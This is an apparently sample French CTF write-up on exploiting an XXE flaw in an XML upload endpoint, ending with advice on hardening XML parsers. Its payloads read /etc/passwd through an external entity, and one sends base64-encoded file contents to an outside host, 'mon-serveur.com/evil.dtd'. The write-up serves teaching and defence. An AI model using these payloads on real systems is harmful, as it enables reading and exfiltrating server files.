---
title: "Exemple: Writeup CTF - Exploitation XXE moderne"
date: 2025-10-15
draft: false
---

## Introduction

Dans ce writeup, je vais vous présenter l'exploitation d'une vulnérabilité XXE (XML External Entity) découverte lors d'un CTF récent. Cette vulnérabilité permettait de lire des fichiers arbitraires sur le serveur.

## Reconnaissance

Lors de la phase de reconnaissance, j'ai identifié un endpoint qui acceptait des données XML :

```http
POST /api/upload HTTP/1.1
Host: target.ctf
Content-Type: application/xml

<?xml version="1.0"?>
<data>
    <name>test</name>
</data>
```

## Exploitation

### Étape 1 : Test de base

J'ai d'abord testé une injection XXE classique pour lire `/etc/passwd` :

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
    <name>&xxe;</name>
</data>
```

### Étape 2 : Bypass du filtre

Le serveur filtrait certains mots-clés. J'ai utilisé une technique d'encodage en base64 pour contourner ce filtre :

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  <!ENTITY % dtd SYSTEM "http://mon-serveur.com/evil.dtd">
  %dtd;
]>
<data>
    <name>&send;</name>
</data>
```

### Étape 3 : Récupération du flag

Après plusieurs tentatives, j'ai pu récupérer le fichier contenant le flag :

```bash
FLAG{xxe_1s_st1ll_d4ng3r0us_1n_2025}
```

## Conclusion

Cette vulnérabilité XXE montre l'importance de valider et sécuriser le parsing XML. Les développeurs devraient :

1. Désactiver les entités externes par défaut
2. Utiliser des parsers XML sécurisés
3. Implémenter une validation stricte des entrées
4. Adopter des formats plus sûrs comme JSON quand possible

## Références

- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [PortSwigger XXE Tutorial](https://portswigger.net/web-security/xxe)
